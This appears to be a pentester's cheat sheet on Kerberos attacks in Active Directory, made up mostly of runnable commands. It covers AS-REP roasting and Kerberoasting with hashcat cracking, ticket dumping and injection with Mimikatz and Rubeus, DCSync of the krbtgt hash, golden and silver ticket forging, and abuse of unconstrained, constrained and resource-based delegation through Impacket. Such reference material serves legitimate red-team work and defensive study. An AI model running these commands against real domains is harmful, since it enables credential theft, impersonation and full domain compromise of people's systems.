# Kerberos Attacks

Exploiting Kerberos authentication in Active Directory.

> [!TIP]
> For Kerberos System Architecture & Concepts, see [Kerberos System Concepts](../../systems/Kerberos.md)


## Understanding Kerberos

```
1. User → AS (KDC): Request TGT
2. AS → User: TGT (encrypted with krbtgt hash)
3. User → TGS (KDC): Request service ticket (using TGT)
4. TGS → User: Service ticket (encrypted with service account hash)
5. User → Service: Access with service ticket
```

---

## AS-REP Roasting

Targets accounts with **"Do not require Kerberos preauthentication"** enabled.

### Find Vulnerable Users
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# ADModule
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

### Extract Hashes
```bash
# Impacket (no creds needed, just username list)
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# With valid creds
impacket-GetNPUsers domain.local/user:password -request
```

### Crack Hashes
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting

Targets accounts with **Service Principal Names (SPNs)** set.

### Find Kerberoastable Accounts
```powershell
# PowerView
Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName

# ADModule
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Request Service Tickets
```bash
# Impacket
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerberoast.txt
```

### Crack Hashes
```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

---

## Pass-the-Ticket (PtT)

Use a stolen Kerberos ticket.

### Export Tickets
```cmd
# Mimikatz
sekurlsa::tickets /export

# Rubeus
Rubeus.exe dump
```

### Inject Ticket
```cmd
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Verify
```cmd
klist
dir \\dc01\c$
```

---

## Overpass-the-Hash (Pass-the-Key)

Use NTLM hash to request Kerberos tickets.

```cmd
# Mimikatz
sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd

# Rubeus
Rubeus.exe asktgt /user:admin /rc4:hash /ptt
Rubeus.exe asktgt /user:admin /aes256:hash /ptt
```

---

## Golden Ticket

Forge TGT using krbtgt hash (requires Domain Admin access to get hash).

### Get krbtgt Hash
```cmd
# Mimikatz (on DC)
lsadump::dcsync /domain:domain.local /user:krbtgt
```

### Create Golden Ticket
```cmd
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Impacket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
```

---

## Silver Ticket

Forge service ticket using service account hash.

```cmd
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:service_hash /ptt
```

---

## Unconstrained Delegation

Computer can impersonate any user that connects to it.

### Find Unconstrained Delegation
```powershell
Get-DomainComputer -Unconstrained | Select Name
```

### Exploitation
```cmd
# On compromised host with unconstrained delegation
# Wait for admin to connect, or coerce with PrinterBug/PetitPotam
Rubeus.exe monitor /interval:5

# Capture and use ticket
Rubeus.exe ptt /ticket:<base64_ticket>
```

---

## Constrained Delegation

### Find Constrained Delegation
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### Exploitation
```bash
# Request ticket for delegated service
impacket-getST -spn 'cifs/target.domain.local' -impersonate Administrator 'domain.local/user:password'

# Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```

---

## Resource-Based Constrained Delegation (RBCD)

If you can write to `msDS-AllowedToActOnBehalfOfOtherIdentity`:

```bash
# Add computer account
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'Password123' 'domain.local/user:password'

# Configure RBCD
impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write 'domain.local/user:password'

# Get ticket
impacket-getST -spn 'cifs/target.domain.local' -impersonate Administrator 'domain.local/FAKE$:Password123'
```

---

## Tools Summary

| Tool | Platform | Purpose |
|:-----|:---------|:--------|
| **Rubeus** | Windows | Kerberos interaction |
| **Mimikatz** | Windows | Credential extraction |
| **Impacket** | Linux | Python toolkit |
| **kerbrute** | Both | User enumeration |
